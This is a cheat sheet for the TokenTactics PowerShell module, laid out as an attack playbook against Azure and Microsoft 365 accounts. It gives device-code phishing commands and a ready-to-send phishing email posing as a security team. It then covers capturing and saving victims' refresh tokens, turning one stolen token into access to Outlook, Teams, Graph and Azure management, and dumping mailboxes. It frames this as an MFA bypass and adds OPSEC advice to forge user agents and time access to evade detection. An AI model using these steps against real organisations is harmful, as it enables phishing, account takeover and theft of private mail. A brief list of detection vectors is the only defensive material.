# TokenTactics

**Type:** PowerShell Module
**Purpose:** Azure JWT token manipulation and token switching/refreshing
**Platform:** Windows, PowerShell Core (Linux/macOS)
**Tags:** #azure #powershell #tokens #jwt #device-code #refresh-token #mfa-bypass #post-exploitation

---

## Installation & Setup

```powershell
# Clone repository
git clone https://github.com/rvrsh3ll/TokenTactics.git
cd TokenTactics

# Import module
Import-Module .\TokenTactics.psd1

# Verify installation
Get-Command -Module TokenTactics
```

---

## Quick Reference (Most Common Commands)

```powershell
# Get initial token via device code
Get-AzureToken -Client MSGraph

# Refresh to different resource token
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $response.refresh_token

# Switch to Outlook
Invoke-RefreshToOutlookToken -domain company.com -refreshToken $response.refresh_token

# Parse JWT token
Invoke-ParseJWTtoken -token $response.access_token

# Dump mailbox via Graph API
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder inbox
```

---

## INITIAL-ACCESS: Device Code Phishing

### INITIAL-ACCESS: Get Device Code
**Use Case:** Phish users for device code authentication

```powershell
# Standard Microsoft Graph
Get-AzureToken -Client MSGraph

# User sees:
# "To sign in, use a web browser to open https://microsoft.com/devicelogin
#  and enter code ABC1-DEFG to authenticate"

# Azure AD Graph
Get-AzureToken -Client Graph

# Azure Core Management
Get-AzureToken -Client AzureCoreManagement

# Outlook
Get-AzureToken -Client Outlook

# MS Teams
Get-AzureToken -Client MSTeams

# Substrate (Office.com)
Get-AzureToken -Client Substrate

# DOD/Military tenants
Get-AzureToken -Client DODMSGraph
```

**Phishing Template:**
```
Subject: Action Required: Verify Your Account

Dear User,

We've detected suspicious activity on your account. Please verify your identity immediately:

1. Visit https://microsoft.com/devicelogin
2. Enter code: ABC1-DEFG
3. Sign in with your company credentials

This verification expires in 15 minutes.

Security Team
```

### INITIAL-ACCESS: Token Capture
**Use Case:** Capture tokens after successful device code auth

```powershell
# Get token and store in $response variable
Get-AzureToken -Client MSGraph

# Access the tokens
$response.access_token     # Access token (1 hour validity)
$response.refresh_token    # Refresh token (months to years)
$response.id_token         # ID token

# Save to file
$response | ConvertTo-Json | Out-File tokens.json

# Tokens also logged to TokenLog.log by default
```

---

## CRED: Token Switching & Refreshing

### CRED: Refresh to Microsoft Graph
**Use Case:** Get MS Graph token from refresh token

```powershell
# Refresh to MS Graph
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken "0.AQEA..."

# Access new token
$MSGraphToken.access_token

# With specific client ID
Invoke-RefreshToMSGraphToken -domain company.com -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -refreshToken "0.AQEA..."
```

### CRED: Refresh to Azure Management
**Use Case:** Get Azure management tokens

```powershell
# Azure Core Management (for AzureHound, etc.)
Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken "0.AQEA..."

# Azure Management
Invoke-RefreshToAzureManagementToken -domain company.com -refreshToken "0.AQEA..."
```

### CRED: Refresh to Office 365 Apps
**Use Case:** Access M365 applications

```powershell
# Outlook
Invoke-RefreshToOutlookToken -domain company.com -refreshToken "0.AQEA..."
$OutlookToken.access_token

# MS Teams
Invoke-RefreshToMSTeamsToken -domain company.com -refreshToken "0.AQEA..."
$MSTeamsToken.access_token

# SharePoint/Substrate
Invoke-RefreshToSubstrateToken -domain company.com -refreshToken "0.AQEA..."
$SubstrateToken.access_token

# Office Apps
Invoke-RefreshToOfficeAppsToken -domain company.com -refreshToken "0.AQEA..."
$OfficeAppsToken.access_token

# Yammer
Invoke-RefreshToYammerToken -domain company.com -refreshToken "0.AQEA..."
$YammerToken.access_token
```

### CRED: Refresh to Other Resources
**Use Case:** Access additional Azure services

```powershell
# Azure AD Graph (legacy)
Invoke-RefreshToGraphToken -domain company.com -refreshToken "0.AQEA..."

# Office 365 Management API
Invoke-RefreshToOfficeManagementToken -domain company.com -refreshToken "0.AQEA..."

# Office 365 Suite UX
Invoke-RefreshToO365SuiteUXToken -domain company.com -refreshToken "0.AQEA..."

# MS Manage (Intune)
Invoke-RefreshToMSManageToken -domain company.com -refreshToken "0.AQEA..."

# MAM (Mobile App Management)
Invoke-RefreshToMAMToken -domain company.com -refreshToken "0.AQEA..."

# DOD MS Graph (military)
Invoke-RefreshToDODMSGraphToken -domain company.mil -refreshToken "0.AQEA..."
```

---

## TOKEN-ANALYSIS: Parse & Analyze Tokens

### TOKEN-ANALYSIS: Parse JWT
**Use Case:** Decode and inspect token contents

```powershell
# Parse access token
Invoke-ParseJWTtoken -token $response.access_token

# Shows:
# - Issuer (iss)
# - Audience (aud)
# - Subject (sub)
# - UPN (user principal name)
# - Scopes/Roles
# - Expiration time (exp)
# - Tenant ID (tid)

# Parse refresh token
Invoke-ParseJWTtoken -token $response.refresh_token

# Parse from variable
Invoke-ParseJWTtoken -token $MSGraphToken.access_token
```

### TOKEN-ANALYSIS: Get Tenant ID
**Use Case:** Find tenant ID from domain

```powershell
# Get tenant ID
Get-TenantID -domain company.com

# Returns tenant GUID
# Can be used for targeting specific tenant
```

---

## EXEC: Using Tokens

### EXEC: Connect to Azure AD
**Use Case:** Authenticate to Azure AD with token

```powershell
# Connect to Azure AD PowerShell
Connect-AzureAD -AadAccessToken $response.access_token -AccountId user@company.com

# Now use Azure AD commands
Get-AzureADUser
Get-AzureADGroup
```

### EXEC: Dump Mailbox via Graph API
**Use Case:** Extract emails using MS Graph token

```powershell
# Dump inbox
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox

# Dump sent items
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder sentitems

# Dump deleted items
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder deleteditems

# Dump specific folder
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder "Folder Name"
```

### EXEC: Open Mailbox in Browser
**Use Case:** Access OWA with token via browser

```powershell
# Open Outlook Web App in browser using token
Invoke-OpenOWAMailboxInBrowser -AccessToken $OutlookToken.access_token
```

---

## PERSIST: PRT Token Refresh

### PERSIST: Refresh PRT-Derived Tokens
**Use Case:** Refresh tokens obtained from PRT

```powershell
# After obtaining PRT with roadtx or AADInternals
# Use special client ID for PRT-derived refresh tokens
Invoke-RefreshToMSGraphToken -domain company.com -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -refreshToken "0.AQEA..."

# PRT client ID
# 1b730954-1685-4b74-9bfd-dac224a7b894

# This allows refreshing tokens from PRT-based authentication
```

---

## EVASION: User Agent Forgery

### EVASION: Forge User Agent
**Use Case:** Randomize user agent to evade detection

```powershell
# Generate random user agent
Invoke-ForgeUserAgent

# Returns random browser user agent string
# Can be used in HTTP requests to blend in
```

---

## Token Management

### Clear Tokens
**Use Case:** Clean up token variables

```powershell
# Clear specific token
Invoke-ClearToken -Token MSGraphToken

# Clear all tokens
Invoke-ClearToken -Token All

# Available token variables:
# - MSGraphToken
# - GraphToken
# - AzureCoreManagementToken
# - AzureManagementToken
# - OutlookToken
# - MSTeamsToken
# - SubstrateToken
# - OfficeAppsToken
# - YammerToken
# - OfficeManagementToken
# - All
```

---

## Attack Patterns

### Pattern: Device Code Phishing → Token Theft → Full Access
```powershell
# 1. Send phishing email with device code
Get-AzureToken -Client MSGraph
# Send victim the device code via phishing email

# 2. Wait for victim to authenticate
# When they enter the code, you get tokens

# 3. Save refresh token (critical!)
$refreshToken = $response.refresh_token

# 4. Switch to different resources as needed
Invoke-RefreshToOutlookToken -domain company.com -refreshToken $refreshToken
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $OutlookToken.access_token -mailFolder inbox

Invoke-RefreshToMSTeamsToken -domain company.com -refreshToken $refreshToken
# Access Teams data

Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken $refreshToken
# Run AzureHound with this token
```

### Pattern: Single Refresh Token → Multi-Resource Access
```powershell
# 1. Start with one refresh token (from any source)
$rt = "0.AQEA..."

# 2. Get MS Graph for user/group enumeration
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $rt
Connect-AzureAD -AadAccessToken $MSGraphToken.access_token -AccountId user@company.com
Get-AzureADUser
Get-AzureADGroup

# 3. Switch to Azure Management for resource enumeration
Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken $rt
# Use with AzureHound, PowerZure, etc.

# 4. Switch to Outlook for email access
Invoke-RefreshToOutlookToken -domain company.com -refreshToken $rt
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $OutlookToken.access_token -mailFolder inbox

# 5. Switch to Teams for message access
Invoke-RefreshToMSTeamsToken -domain company.com -refreshToken $rt
# Access Teams channels and chats
```

### Pattern: MFA Bypass via Token Refresh
```powershell
# Even if user has MFA, once they auth with device code:
# 1. Capture refresh token
$rt = $response.refresh_token

# 2. Refresh tokens do NOT require MFA
# Can refresh indefinitely without MFA prompts
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $rt

# 3. Tokens remain valid even after:
# - User closes browser
# - User logs out
# - User goes offline
# Refresh token valid for months/years depending on policy
```

---

## Integration with Other Tools

### Use with AADInternals
```powershell
# Get token with TokenTactics
Get-AzureToken -Client MSGraph
$rt = $response.refresh_token

# Refresh to MS Graph
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $rt

# Import AADInternals
Import-Module AADInternals

# Use TokenTactics token with AADInternals
# AADInternals can also use same refresh token
```

### Use with AzureHound
```powershell
# Get Azure Core Management token
Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken $refreshToken

# Save token
$MSArmToken = $AzureCoreManagementToken.access_token

# Use with AzureHound
azurehound list --jwt "$MSArmToken" -o tenant-data.json
```

### Use with PowerZure
```powershell
# Get Azure Management token
Invoke-RefreshToAzureManagementToken -domain company.com -refreshToken $refreshToken

# Connect to Azure with token
Connect-AzAccount -AccessToken $AzureManagementToken.access_token -AccountId user@company.com

# Use PowerZure commands
Import-Module PowerZure
Get-AzureCurrentUser
```

---

## Common Client IDs

```powershell
# These are used internally by TokenTactics functions:

# Microsoft Graph
"d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Azure AD Graph
"1b730954-1685-4b74-9bfd-dac224a7b894"

# Azure Core Management
"d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Outlook
"d3590ed6-52b3-4102-aeff-aad2292ab01c"

# MS Teams
"1fec8e78-bce4-4aaf-ab1b-5451cc387264"

# Substrate (SharePoint/OneDrive)
"d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Office Apps
"ab9b8c07-8f02-4f72-87fa-80105867a763"

# For PRT refresh
"1b730954-1685-4b74-9bfd-dac224a7b894"
```

---

## Resource URLs

```powershell
# Common resources tokens are requested for:

# Microsoft Graph
https://graph.microsoft.com

# Azure AD Graph
https://graph.windows.net

# Azure Management
https://management.azure.com

# Azure Core Management
https://management.core.windows.net

# Outlook / Office 365
https://outlook.office365.com

# SharePoint
https://[tenant].sharepoint.com

# Office 365 Management
https://manage.office.com

# MS Teams
https://api.spaces.skype.com
```

---

## Pro Tips

💡 **Refresh Tokens are Gold**: Save them - valid for months/years
💡 **MFA Bypass**: Device code + refresh token = MFA bypass for token lifetime
💡 **Multi-Resource**: One refresh token → tokens for all resources
💡 **Token Log**: Commands log to TokenLog.log by default
💡 **Parse Before Use**: Always parse JWT to verify claims and expiration
💡 **PRT Client ID**: Use 1b730954-1685-4b74-9bfd-dac224a7b894 for PRT-derived tokens
💡 **Combine Tools**: Use TokenTactics with AADInternals, AzureHound, PowerZure
💡 **Device Code Phishing**: More successful than credential phishing (users trust MS)
💡 **User Agent**: Consider using Invoke-ForgeUserAgent for evasion
💡 **Token Lifetime**: Access tokens ~1 hour, refresh tokens months/years

---

## OPSEC Considerations

⚠️ **High Risk:**
- Device code phishing from suspicious domains/IPs
- Rapid token switching (many refresh operations)
- Accessing resources user wouldn't normally access

⚠️ **Medium Risk:**
- Using tokens from unusual locations/IPs
- Accessing mailbox outside normal hours
- Dumping large amounts of data

✅ **Lower Risk:**
- Using tokens from same location as user
- Accessing during user's normal working hours
- Using forged user agents
- Slow, methodical access patterns

**Detection Vectors:**
- Azure AD sign-in logs (device code authentication)
- Token refresh events
- Access from new locations
- Unusual Graph API calls
- Multiple resource access in short time
- Token issued to unexpected clients

---

## All Available Commands

```powershell
# Token acquisition
Get-AzureToken

# Token utilities
Invoke-ParseJWTtoken
Get-TenantID
Invoke-ForgeUserAgent
Invoke-ClearToken

# Token refresh commands (Invoke-RefreshTo*)
Invoke-RefreshToMSGraphToken
Invoke-RefreshToGraphToken
Invoke-RefreshToAzureCoreManagementToken
Invoke-RefreshToAzureManagementToken
Invoke-RefreshToOutlookToken
Invoke-RefreshToMSTeamsToken
Invoke-RefreshToSubstrateToken
Invoke-RefreshToOfficeAppsToken
Invoke-RefreshToYammerToken
Invoke-RefreshToOfficeManagementToken
Invoke-RefreshToO365SuiteUXToken
Invoke-RefreshToMSManageToken
Invoke-RefreshToMAMToken
Invoke-RefreshToDODMSGraphToken

# Exploitation
Invoke-DumpOWAMailboxViaMSGraphApi
Invoke-OpenOWAMailboxInBrowser
```

---

## Token Scope Examples

### Microsoft Graph Token Scopes
```
openid
profile
email
offline_access
User.Read
Mail.Read
Mail.ReadWrite
Files.Read.All
Sites.Read.All
...
```

### Outlook Token Scopes
```
https://outlook.office365.com/.default
```

### Azure Management Token Scopes
```
user_impersonation
```

---

## Resources

- GitHub: https://github.com/rvrsh3ll/TokenTactics
- Author: @rvrsh3ll
- Co-author: @0xBoku
- Inspired by: AADInternals (@DrAzureAD / Nestori Syynimaa)
- Related: https://o365blog.com (Dr. Nestori Syynimaa's blog)
- Phishing templates: resources/ folder in repo
